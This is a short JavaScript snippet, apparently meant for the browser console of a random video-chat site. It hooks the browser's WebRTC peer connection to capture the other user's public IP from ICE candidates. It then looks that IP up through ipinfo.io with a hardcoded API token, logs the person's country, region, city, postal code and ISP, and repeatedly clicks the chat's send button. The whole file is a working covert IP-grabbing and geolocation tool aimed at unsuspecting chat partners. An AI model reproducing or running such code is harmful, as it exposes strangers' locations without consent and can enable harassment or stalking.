window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection

window.RTCPeerConnection = function(...args) {
 const socialcodia = new window.oRTCPeerConnection(...args)

socialcodia.oaddIceCandidate = socialcodia.addIceCandidate

socialcodia.addIceCandidate = function(iceCandidate, ...rest) {
 const mufazmi = iceCandidate.candidate.split(' ')

if (mufazmi[7] === 'srflx') {
console.clear()
fetchLocation(mufazmi[4])
}
return socialcodia.oaddIceCandidate(iceCandidate, ...rest)

}

return socialcodia
}


function fetchLocation(ip)
{
	fetch('https://ipinfo.io/'+ip+'?token=c1c66cfed48606')
	.then( res => res.json() )
	.then(response => {
		console.log("Country :"+response.country)
		console.log("State : "+response.region)
		console.log("City : " +response.city)
		console.log("Pin Code : " +response.postal)
		console.log("Org : " +response.org)

		writeMessage(response.country,response.region,response.city)
	}) 
	.catch(error => console.error('Error:', error));
}


function writeMessage(country,region,city)
{
	let chatmsg = document.getElementsByClassName("chatmsg");
	let sendbtn = document.getElementsByClassName("sendbtn");
	for(let i=1; i<10; i++)
	{
	sendbtn[0].click();
	}
	
}